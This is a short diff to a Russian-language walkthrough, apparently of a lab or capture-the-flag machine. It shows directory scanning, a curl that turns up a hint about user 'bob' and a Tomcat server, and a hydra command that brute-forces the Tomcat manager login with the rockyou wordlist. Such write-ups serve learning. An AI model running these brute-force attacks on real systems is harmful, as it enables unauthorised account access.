@@ -32,3 +32,12 @@ dirsearch -u http://10.129.187.90
 <img width="705" height="448" alt="Снимок экрана 2026-05-06 в 07 34 57" src="https://github.com/user-attachments/assets/8441671a-f8d9-4b02-9736-ada54435d800" />
 И gobuser нашел еще один путь 
 
+```
+curl http://10.129.187.90/guidelines//                                                                              
+Hey <b>bob</b>, did you update that TomCat server?
+
+```
+```
+hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.129.187.90 -s 1234 http-get /manager/html
+
+```
